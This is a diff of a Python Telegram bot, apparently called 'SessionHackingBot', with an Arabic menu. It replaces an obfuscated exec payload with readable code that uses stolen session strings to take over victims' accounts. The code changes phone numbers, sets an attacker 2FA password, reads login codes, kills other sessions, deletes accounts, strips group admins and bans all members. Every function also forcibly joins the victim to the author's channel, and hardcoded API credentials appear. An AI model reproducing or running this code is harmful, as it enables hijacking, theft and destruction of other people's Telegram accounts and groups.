@@ -1,4 +1,946 @@
-#https://t.me/Source_Ze
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b85decode(b'c%1EBdvFxTnV*@RogIxH2qA-vF&+~?5V3{8fP>=)2q7dM0wXYH97kSlkE9j*(#$Ma%8EN9FocV8)aCLhV&_ESI}kC(1pKTkS1RYaN~Kb+)Yau`HA(poU)5E7cU70Vv#+i=C%*6NdF<@&jI?ry<DAjd_Vi4D-P6<GufOl>ue(S8%#{39!EXcn^e4g$Lm0v)m?W#PEXKJ6r*Lo%B|=GF;gew{oD>ux8BrohQ4uK(pQuVoie%GQE7dAHRHM{-a?`u?T&L8*Ih^2<^OSishmfdG&R6Cq8<d9R0%ZZqK<-AR5yBgkg(^=XL?l(?p`k_ULLyDDN)zO%rnR||=C4UCPTr&}N#3k1P2Qr&$y=3W^nPvPGs)YO+iAQmaYyn_Ww~9$kP?FPJSYR+gx;&Cb!evX`B2^p<+HRNcPV$PO+2HtC@bNrRar&fY&EUnJ?h<r>*r3fnRTQ=Swj|(#-og~mfS!V!g(E8M4I4yFS(H{hV$nJ7-c=Vi7bKmedK1c6waR~w-6c5_mf-6GB`g#K0|JU^MmAeatE9rB6pJIaNa<g$qG1cB%dXB!MTmxO<Lf*iL4~8aBin>wOQG$ZXW7@-xjiJ0=c(Z=_L0=yU3d8R#hC@M%KcyZi1und*N{6pM%4RuZP2l-v<Z82g3B~^KdvR_ru}DAArM&KM02te+Z63?hSA_DI4K%;%#s^@l9}G4qg=}x080V`3yI}4)DqjwP~_j4G--k9c0S{dxj;Qr0Xa%&MLdyl&xeN*?yEEJ0>_t@AgUG=}F&39;WGw?DU6+cB^%hJ!Chet)oxqA$usro)U_^F2y4O6#HC?M*}GKyA(<Q#bYkT7Xm0AcPYLYK+)?`JP|+<bt(D+C}J)J37}A2iv9qK0heMhfFkZv3<Xdea48Z26iJsN<?xoINd|hy-V(}Tmr`@eBD(SjF-R7u_mxl|bg2)y)K8KTpnSB1a@3{#l3U09BsUH{5h#^24D?8@hiM*r7iDfUYYLmvss8vtcXQaR+oLAb0WF%`l!&V-!xYqmaMI1H{%k5{#M3F=3>zaERX2sUtYM^6kiE)?Csm>*j3}0+kLZS)Yz~<>ZW@fHQfgvXR5RkScqR(vY$VAz6tSp0iKh7F*`%paBdwW&qIO1O2j2bWkDg*pc^z55KGwIoZ(VD2b!_db_5HC`{p;8FkyY#0u3LNWJ*~~GQq`9>dX4k}73!#k@J)I1mMyCFB$e#S_9fym`+53qbvUc)hS{(+9Z%UeoqG$mtI>mM$<4-gXeguPF1&wjkD<j=13jv)$7$;<-mU8J(5x|-*5ad4+J-K<7N#7~B#RM^^kqv5Rp#4;;p;=uZD}LMdz7YVE6%?|#kq%N7=tm`9I&0Rgc}d7VY)z>bTX&d(@V$r9M3aj;W1%!VJ>WNBs9*BvsOCG>|;_5JY$4LwzCW#`<WEi%FIZ4u#A!?yf5XX4`tYw@+U=<Yk)F5Bn(AzY>vx?h%gay@{C3HK`z4ZaEynXa!90yaZ2z>6?>RgpZllS;a#iTmeM;~-7-)WLuaY#*6N^vwRsR+l{WOGvsz5;Rn)7E8@f^?9!>4dkOJ$jR&VGcdT(bsK~xR;LQQ5col<*K*<_!pne(ixSemH4gHe4@kqS5VbTo@5XAGDj9Xc651aLHK+oHO<`N^1?LG+m61mclG$BaZ{v2-?NC=K}J0d*G^<iJaW-e_o8j$l8T$48i<w2?8{N6irQ5L1ZRJzZ1vY{Hmgv=vw|M+VG>7%kJTHm#nFAX|s9W0$ZZ%drdD8djL$j5KikrY_tB*V<i>Gsbz)D|penA{f2Q>G#IC90%wPjq!k=P{rsCrYuEosABYnDnl>O+1NG2p(-NKBQg;p;socSIBZBcC~F_Xm7%hS@nCYvjF{9GVbFxZjS%c<4k`1ZiA4HPZ+`+H7K6A_7t3lI@Y-gmQfCoFGZ_lQW=>m-tQSFE86ar%=4x#T7I-rTOEI_w1H=GDpLQz*%Hke1MLg)+1Te7?s3CWi8obkEmkGEwv}QqDhWS5(!5tXfiNSIVnlV`62A{<m)fNHqfw^H2DR>)&{BP?-Z6#um^<XgM#h@67!PEaZ#^%^b?u>ms#sLyoBjk%Neq>h(W`Ze4%P7OXIOIp3^P%*^AwTk#m(mb&+^h&=^sA)^n-YQ%)*LB-!xRQoqc^FRf}{oMLKd%)%_e)Gl(k}3S3zO+rys+{zk_mhF<Un)SG9XexyX6B$OLootudCiT#!^~D{JE*%0wAuko@?D52e5S_+gR!0RE0MUaC_54S(S9Pyf$S?rE*q{6b(KHaX3h;tJd;Wlfc#YG5jXR?A?M-e&V=R?e)Oku$$!0y%U3BXGvQy+0ynu)T+b$p{IbVP|ahyxZz;l}Y8IK69hfaYn1V<Y-ck4Q7pav{|e~u-Yc(MoYsxB6Y0~rv$LR!4Nox?Ym?aHfi@FdqN)epfOqNu%~k-1F~T(G^0XouUPe_DptMUs#x{@sEBfTE;JNIqtRBog(ET{dGao|a(Spl_*D^ULU5?85`B%vc8`L-uM7&+GbrdO(X38JQ&CWBR5{ngQwQUQ+Kci~hrvrUWk;)R<%dF2sZ~iFC9SSQMqR1Rq;=1w6eXlLO2=5rJVMdqCUz*{orh9jjq;`#*DWfgDw;~CMw02QuGD1WDVG=qd2u75&Llh}S`%7KGf#zx85+<sCXcoDl_!ymmQJP(_3MbU6}JAK-GW?>pnYgYnX+Lf&`PsNl~T|KQ<j1@SgMqQHdx-5f|i{O6XA@9?i!A8?)QLo^<1pU(K>7JEqC?EZJT@cz#t_U8Hz}evARF%E2|=i4@i6-8FyF3D5z)Y_yN7cMdJq)Uh^Fs^v{HYR%)+t72_b7vJ?kg#W>(9!$FQiVPt@?n&4J5qhGv-QtyMY&*)M}!?AE^NF)(-Nl);FvWEY`7G}jX-lM7@{PqKVEBw~^qovP-mPgCbBF$hKvZl}<Pk{B%0Yi%W@b-EPK8I;l!MK?Z;!o?%c-%$QFQVO#u;Jpw7BkfTx6R2XeKcVbr0JV;0T=4Zr3kL}Qg9Uw47gyE@@KO^tJH7_rYtpFf}vGvQU*h-*rbGK=h*R?&70r4=FNM)M&(pEkc(56xo_F^sVIyId`(OAYYb@VZ02odE~aJYr-MWM@5~`>GX@<#O)pXJ5pDbbnp4|%eLC7c{5!Y(j6*IG^W};N)*9tWgq;gdwlO7U5voJU;mLO(7}Wx}vZ2(OVT3?!Kx@)-IP)Nc!Z<s?`MC}Dc^n6Nzqb{jUGIQ)jiBlq3$b82?1TFR;)g>d)MLk5!9<~Ig!ibCj-p}FD#msom{NaS11pyblP!3+jfxQ0A?oM_Dri<yy`Yx1FBi)$!IrI|Ez40C!&dldJN;U)V#AVzY$s6AK(w>sA*)ug$@q*9rQl2X_r-(Tp|CZFO^u4B1)~B+JrWoT!nYYBJsY|gurT~j>wt%oU_KN~QKPB?Cz79G=^X``rN%;h`7f%Ocj@#DYlai?WZW=WsaXm(6KbiM;Eq&yLw(Yqu0y5P9`cZQG?5;#yidH>`xMtU`Sm?iRY`q7zm4@+4SWT5!$L4iwMR<jV%UqI`({EA|HovKPJ(1~&;XbTwKI>mjPavOP)>lc$qz*==eEZj%{wIw=fTj-`<j{SJlMIb3_D`5nc30IDzyjW>LC{kGq_chdh}3wZA+z|4pTDd<D%1RI+ZKU;SwX0N|a#Sz&Krh0CCe|<7PJ0)KiD_5|rNiN@Y(Ga%S<w{Lu_*i=CKb91&3B3<-drR>05FT!=&vJs^EVIE!$udNvGFC<F+4+eOgZfS|WQ28Ak+LFJy98HOv`E>x5C(x%Rh-QAnF%iSAyY?cqpqm8n2XK&AL`{o9%2Qd;XolGthQ^K*qC=6ack2kkCYRmyv0aJT}fK`LQirF*Mk0Q8MR}3zmmF(e+$ZGo?v8o<a6H1jkX_@^oXgNt*wsDz!-(mT&>0|lV@|UKcnm#U1ADMo7`b7S0{`|`6akzIPe-1C?{MqTF`Sa5!<>`~t$EJ@?k53=ZpM4yPXtRpQKM(2WWH=q0KAC?_#v+021e~4h5WSo~pMN2Larzjhe}DR@{3UqA5xAtqUx4(pSjbmor$#;*PvE_i5I<?<x&jF=wY0RzSes2&ZN3CmeF`$3%wLh6*I0?K204zyL(f9#ufU61MZn9P$X}!-pM!*p_-c@lzm&fWRm5WOtxx2CkiTTp+a=Nqr&P?2^?wEOT`V*Neb&nmp27OH7q`|~s5_K-2{S@b$7OiU3sCnHSTk(DFUxl2AmK9PItdlZU(CM%6i2PPe7U6UUYmYe#ySA$5l`kzP@VDoWvs(yyAEfe;x8kA?DnS*D{ZUU%9EkM4i`nQLme(c+Htoex$>f*q%By|<Bw5>UkEN^_JTU?cRUZd#*w$jFbl<S{sNSC1X=w8VBiFT8q!t*#Z%biNOc03ZlSxY&{l|w{24D}fe86{nIaq;QbzRP$+|sd(VWAFU}0PB!Y<@rw2|$w4O6!jr+Oa)WnZEF6Kjg6az<eZ+n34KJ7b?ZNm~mTe8Od}T?zsSfQQibD`kgM%Iola1gB32MVVlCNeUld9&}p;T}EoF<HAF(V3Fss+dvV2Gkp>W;gXh*iL`~?Mw96YAN2|}CX{@_?e^2hp?2q{k4uu2MfokQSn<y3XRNB8gZ$qs2Y3E?8&32A7lGNwEKvfzQ{JGcJ=shqtr<|viWQQ{Zk%FGo<xnP$+ns7CX;P9+07=~VX|9Hw$o(0Om?fuZZp~KCcDFAyWhv5h0QI*)upQo1`Q*l-?wt5(UMeGZr<Lxzis2Fuu?a`3IVAc$wUpXWK(5R(Y#{;?13Q141rB*z(@^k0J;v5g^?RG1f!`OOZW-S(SWJjC>6SoEh>&uMZmiEP}x@1`-^F9;oV=)zam3xK5fDG2hbky8@;8d?t6Fb-PyKt&qK884-7_Q2i{-d%}-f;6gh=rSGJ-Bd`zF5VwFfAT`#6*8!+c(Y@z&R8H6g}=C9$23yYpuP*ppS9A)9j>2caQvGjrvw4htm*KU<$P%g;a;@3MYuf(c1^QIKndox=6U=-Rvf*LoJ)e>e{Q!|N?=8zeti{3Px6H}@Z>VTReeIw;V%5>&6)Xfc)Z$e1=ko%AiFXXMWmPM-~OrKc9Vb=bk;@1V6!#&It+YOk&nHlN^m}31+&ifP5WFLt>_){nX-8YOjf;yhll9<fnD!sC45*JT6NHUm7wggFBDUv8g!rfX5U!k^$FIpO(iSxnDA=-4BhJkKX!oYZKdA(_4V3l=Ttj5?)R7taF2dN384Pz-!`jm{X|8vNwjWRx~I$T$X%v!IGuX~1doglv+V~x-dPiT`&a5N4b%Z=mV#KUknahyiva7i(}Lch9`BEsRstKe|r5*$vv8jeEl8aSMkS~#3|9UM-49vqm1H$szPQcvbv3zDIWvqJ)DFu-_zmV=JIpuj}m!PXLwk=#&bBsX?zxC%r20tR2ipcjKDFo<H%hd~Sjf`N)bKL!IB3}O(+U<iW)7$hLbuCZjr3#cD#MTwf?Br0aAbkSfqR-{wmjwD$)6Y1h0vnG~K9aJ@)uAnp{Xkz!qiPe3Dcq$Q3sT7N5jSl_Q855d(QcYz6s}!1>XdgPDj`XFY8Y%5uVJhB!?m7WN3qv)mef%#c`ourrA^_!o<8RcC0R4X<`Zg9}uxNGL9$yT?U~U<8#f1o4aJIlT?{UqAEoWR|@U3l6Er)UdcZNtp4%ht$Mx%}By7A=aVW76go+)C6B*J^k5a_I;UpcLeQJsUKAqgMgPqCV0)Zl=BoEr=0!jrW*!2TlU3=3t3C+l#LF}&+MDqcV#xlW{dQiThVQ%(3}$RjOcyiX6n?aXU4tGnNCW-R54c0|E;_gMF6=Q-9%b~jK{8-(7stdD|yXW4FW{URL)6b1-rL_(%>cFCY!E})&&B3X)s!u9=!uW{M5==i*OxP(Nv76P{zPZ}nBXtYt1+EpVOPv~;netCm!VKit-`EIRW_7G<g{a|TbL5mL_T&AGMWyj*OyD8i~QflH_#tpt19l&8jm#Og<`JHE<`;S-uT(;`nJl|T`m&0HTgFm5N6rC}es%O9+P^k-6LtDp;Soetb6yDnJXcjY+P*WzK&OjJGq{R)@495~_T~(@RU+<46R1LdXvry>g)@U0Q4;^TOZbYimE>D+OyyyDdxh5Dw*U@1#$1R6}bR!I;Ti}iaKM}4ZPW!6U)!Tx7H$P^4)y?UT(9yS6-qB0Dx!uM1*}K^Ao31zi^|I~-mcUVLF<f3mF`mtQtZ=fSRP6^P?KlQ5g0vGDQ1sm6pl2!^2#Qi;0$E$lIW`@)um}wGEam#9V6Oj*Ki6OV{c@d_%?FgtTbRi4P`=B5D)hs%V&WYa6M4TyZitEO)@v&5ED8D`%JT0OxnFE|(8?m$kLw?xL-v9*CO<_13Y4@)7xJ&-ptIZ|Q<P<;x5O5CMr`}Tbgls1H#0z$@PL+yml`P)qD=_Vg}xB20~tkO+WzShPVaBKwrbasb8BapbJqq7k2qM+P6ddiJ7*C~o3D$df>_eN?x-s5FC2a4pyFt`<MU*ZB=Crnk5e3Ux)AtU00h=n(Cs^}!yp(2{SFKYu4>zHRB$j~6W-r7SLS!k%KY{Un7`#Z^MjfHgewCI{`YIl_LjM_ecP;T-(3OQJA>K&wm;in{FqfeuRT-lXkeLCV}<NCU3UL$c6Mh!U~FFiof<?7@)%Cw+0#1#6F_uca~y1jac6#DhDo+_KzS5Va2#n6Kj+FZVyT*AV0$i?+vVnuZ@iSnCAUCpJLF|=TX<%<g66{J3gQheh=XjGXfTL*b|FVW+!YMsH~m5UjgQ}6Ed{U-RDb9~_2s~UbOEZ5GX=wBmKny6WQWdKBCVU1nZvUfqFX<ejQpyPcJa!Kr}NK4^g_$WCk5up`Fm&O{NY(RzpaS#5ijQ@|LK=s{vpi|ni>vB4Ht})To`I#mpUd;^avHWtOXZ8AC%!IQi>nT=W(_IpGV*zCA+w+2zxe~7L%RCWW>-VsshHXg#<-b(8^-B%CG<GTi?XrCl|91IhbvZ`1<(hB0g-|KyTllA*L7mV!Dq0nk;N@51!WfAAhO#lRqT3N1Mux>#^`YCRJ0kGOsf0>pd6A|5|~u{Va;ZFO`Zz&$_U}QkH<lRQaivO0jp1v|hW5Bi{)GGnCQNfe?Czb9UYOK!~H;)&vVgJBmPrbJNuhh~5aA8~n=ecW!Vd7!3&kq*omv6=0NOCL_5p3FB;^lh2SQtG)XcX}OWWas`?$2Bt@h8tbV!Ar~39cess-Iq?*$-G|R7RfW8%dU{9l?wU+J$TLRmDR$%}%ZydA%;;^DrrM~>RgJUWn%mnGst#ABB<tK7w14t-&n)DNWnH1B%qV!vlF05_L(ftwTuSLqf)^HBQE$}rap^H!WQhht{#BIA){>X=o@J0!jvpzwuui~G<QQgsTzU-BEH`I?-dVvJlneXiC43$_Psh<QVl72{sb~`Qae4HBB*)U35!o12W%|(?nSK=pKOZ7TQ$&sps<8v|NII*@*2g+9E)S#)Ic;R5xU3uLjNG5r<khXRuEwmw{0ai{cN?)0Z)N;ub_@Cqjpi$}QqlTnZ+FEKZE?5F9nQFRTJ|QOw3ZE_n1Rs|3Lv_2fi_CE#j9*-5f+W@PrTcijg?lc*uHa1&x#dN^SrsqB>YN=8Hws6saQO1hV_K1X6Wa0G+Ys7Eh(0KwI2Pd3jK@<zJ-P_t%!6JIqtdZ4iIB6aLyw3l1b2dI5@U}ZKN^lSO_AmfopUuzwWX%M}i~Rx~X;?V%;S+7<ZP~VBB6}GY|stS6IEq*=yV)ITk;b<8(rMqq50H=^_=A?K9b!XQc@)0O?L2lDEVUs`3t1?np!j<b8vxrpkNeebJO58)<n<EUFu_^v*M1lRE&38xslO*QUXAT36+$dwUBm!zv{7xe2?hg=2-Jn6*xYx7I@)#-MCb)KfmKj%!AKimhIct;W+8CBNYW=|k=+FBR=5L0hB7Y0-mR;JyIv^oB9+6g&FgITjVc7*9}KbGXZEH3+TIyu0T|$O%KCu?XDzOWgI9i-4#NgR*eN9e#r5KnTR`n}+>C3|Cb9(_g2W6IDveMTl?!xTU>?IUMCj_sy&U<t3itM!;Gd6Ip8kkBG}=Y-J@L7KhhZXH-_hYj6v9s>ROL7MzQ!I6Ie*isObgSH*Gqpx?N~-9<6QY7=lu{N}?CKU}A-?|UxvE^gHRcf5|oelhr5$h%F#tf9NMtesibP8%x!lu#m_(7ub8-*aS}8O~_&l+j#ee^nx>4_N!Rs^|jEUbr?x24utMD||E=O_@Bd2lJC{rZ9lrJ^D-RXlUnId%LUy#TbSX6=^g7nplZzfb$)==j#$<uK|e$j|+aw_>K#H_DLG^`i&B-5pFL0ZH7di4b3__xay7$e(kq=t7M#e`^<XU*$R=LdjF9k%FE7d{#l2lgdUxkS1h-zXL-3y@2qN-!3eT$9chuX^^9ja&|Z|DMX!gmxZbgPj)AtvX`=7bVeBV=JbcMfJ5&A(p)N2p428K6fVPP$aKE8&BfBS9Cw(UpsFNb62SF!AMwj~Pq{t{!tdq1g5b~gzgwdBlLWV#G3EEZqK@3ZV@-s@>-!s+k`~>0JQ2oDYkL&fgUXSbbxL%Jxa6Q1viGZewXne5zHL75ADo(JZs_@CBQ^N4yQcFGrmOSLPZFlKZWMqwNg;!T-yJN1Q;9RrV?vdfsuI(PtPtCjo`aA~bFqncM{wOH+jw#lR=xQvTBKj0(+18>S8&pX)p*Giec07L{gF_g&W_-bdH~C~b(Wi-yF|XlwzHC$8vOnks=oc`!hyi_2L_egeMqJfi#9P5;d|x9PDR23h@dDlXTx_&|a<6c}aT|oZGoX0g8Bp|HA5hF?K%rg6;0grU8+@#KYR_lUd@gMN{N$VQuRCVE_ELbYet0%pz06d1XBw6Sf2iqKW8CO>{mk^yr%R0VRy5Lw!aAOXvB>Cd`o+0&SBQvCByG~Dnv_a}uuW}L(~pL*-tX8A4}utN1%X&Ia>f1pLo0~NRw^p*LeKuluUtV{H%CFq4mWxH_;oXX2N7jt$Gh}1bZ0Pl8G~0*q|Galh)N``(=T?Kf|@eo#)!r9f~NxoW6a~~pd#{?Im*ccT3jDYMQ4+fv9BUPmQgvmn125nk46B8^{ohz%AXpzu4A<~9N81QE_*(r?7^;B;w=EVaW?-_eoD@sq~ga<GNCN`GX6fn>q6d`RT!O_O&DeIi)Zhgeg^l2wWSTYUCkuYBXUnR7E^V-KbuI5$aeC!c#6Ok{ud6p@J|+U?(Y2N$4ntc|67TM63*n(x*{6**{8vDivE`m4Yxa6Ur|N`TN^}0{ND`tZ%V9Qhn-LnHtyQh+trTeE;yT<W^E!<<~!xJ7>O48&rYoGP@)Lc(B+|sn5A=LPp49|XG?F}&ON<*c5d6;ZHDQ;8=;PU>tpsPB9x`x^4$NU(&BvJMMHO#_9zDUAyeyvGPumf`X2NG47L{6%ih|jYmJTwQWpC^B$_n_HPnn6Zo*YUu}oB3XvJchB4X9|_H5p*gp(tEX@ep|;rr6sfD*y`&@R?Ccp;jJ_r{4L;+g)>iW=Z#?_TF4k91-Rr>v}fSGbH!k+$sKxp!CZ_O6~i*6Jd<T!Stbq!aFR#XDX3yv+q4-3UQ<#^CNhGm=OT;H;Hd-51s4G3)=-n2~)OcXxMnZ&4z48)|<_v5-u9W?vAz3YShPQnz|&hqW8n+E`PI-&^jB#tsZ;Rc*wq-DF=rOfMs`bTWfm1rgeoN9{GnQOa*Pl3H1)WmCOb5cG*&64wEeDK%!O-t9WxUHi#2TG0=pc%^G{Yd``o0r@L(0^0=VMry$}Lad4IEQT0I|91f=0ENKSapKM5Qt<|{k!Qtvago?0F2*bPiQ<joO_0jgaUkQD@j``rmKWEvQUh3`BK(#%vC=~L)xfU~ezhg%d3GB9>ftvZemCQN@eT}mP8_0F3uwsxA3Ga8*#'))))
-# channel : https://t.me/Source_Ze
+from config import Config
+import os
+from telethon import TelegramClient, events, functions, types, Button
+from datetime import timedelta
+import asyncio
+
+API_ID = Config.APP_ID
+import os, asyncio, re
+from os import system
+from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
+API_HASH = Config.API_HASH
+token = Config.TG_BOT_TOKEN
+client = TelegramClient('ZeHack', 25281175, "6d99cb2b60a2c519fc1f99bd19565730").start(bot_token=token)
+from telethon import TelegramClient as tg
+from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
+from telethon.sessions import StringSession as ses
+from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
+import telethon;from telethon import functions
+from telethon.tl.types import ChannelParticipantsAdmins as cpa
+
+from telethon.tl.functions.channels import CreateChannelRequest as ccr
+mybot = Config.BOT_USER
+bot = borg = client
+
+ZeHack = Config.USER_ID
+
+api_id = Config.APP_ID
+api_hash = Config.API_HASH
+
+Bot_Username =(mybot , None) or "SessionHackingBot"
+
+async def change_number_code(strses, number, code, otp):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    bot = client = X
+    try:
+      await bot(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await bot(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+		      await bot(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    try: 
+      result = await bot(functions.account.ChangePhoneRequest(
+        phone_number=number,
+        phone_code_hash=code,
+        phone_code=otp
+      ))
+      return True
+    except:
+      return False
+
+async def change_number(strses, number):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    bot = client = X
+    try:
+      await bot(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await bot(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    result = await bot(functions.account.SendChangePhoneCodeRequest(
+        phone_number=number,
+        settings=types.CodeSettings(
+            allow_flashcall=True,
+            current_number=True,
+            allow_app_hash=True
+        )
+    ))
+    return str(result)
+
+
+async def userinfo(strses):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    k = await X.get_me()
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    return str(k)
+
+async def terminate(strses):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    await X(rt())
+
+GROUP_LIST = []
+async def delacc(strses):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Ids_Holder"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Source_Ze"))
+    except BaseException:
+      pass
+    await X(functions.account.DeleteAccountRequest("I am chutia"))
+
+async def promote(strses, grp, user):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    try:
+      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+    except:
+      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
+    
+async def user2fa(strses):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    try:
+      await X.edit_2fa('ZeHack IS BEST')
+      return True
+    except:
+      return False
+
+async def demall(strses, grp):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
+      try:
+        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
+      except:
+        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
+      
+
+
+async def joingroup(strses, username):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    await X(join(username))
+
+
+async def leavegroup(strses, username):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    await X(leave(username))
+
+async def delgroup(strses, username):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    await X(dc(username))
+    
+
+async def cu(strses):
+  try:
+    async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+        k = await X.get_me()
+        return [str(k.first_name), str(k.username or k.id)]
+  except Exception as e:
+    return False
+
+async def usermsgs(strses):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    i = ""
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    async for x in X.iter_messages(777000, limit=3):
+      i += f"\n{x.text}\n"
+    await client.delete_dialog(777000)
+    return str(i)
+
+
+async def userbans(strses, grp):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    k = await X.get_participants(grp)
+    for x in k:
+      try:
+        await X.edit_permissions(grp, x.id, view_messages=False)
+      except:
+        pass
+    
+
+
+async def userchannels(strses):
+  async with tg(ses(strses), 25281175, "6d99cb2b60a2c519fc1f99bd19565730") as X:
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@Source_Ze"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    k = await X(pc())
+    i = ""
+    for x in k.chats:
+      try:
+        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
+      except:
+        pass
+    return str(i)
+
+
+
+import logging
+logging.basicConfig(level=logging.WARNING)
+
+channel = "Source_Ze"
+menu = '''
+
+"A" :~ [معرفه قنوات/كروبات التي يملكها]
+
+"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
+
+"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
+
+"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
+
+"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
+
+"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
+
+"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]
+
+"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
+
+"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
+
+"J" :~ [حذف الحساب]
+
+"K" :~ [حذف جميع المشرفين في كروب/قناه]
+
+"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
+
+"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
+
+"N" ~ [سبام و نشر تلقائي]
+
+تم انشاء البوت بواسطة مودي الهيبه
+
+
+'''
+mm = '''
+**⚜قم بلأنضمام الى جروب الدعم ايضا @ZeSupport⚜**
+'''
+
+keyboard = [
+  [  
+    Button.inline("A", data="A"), 
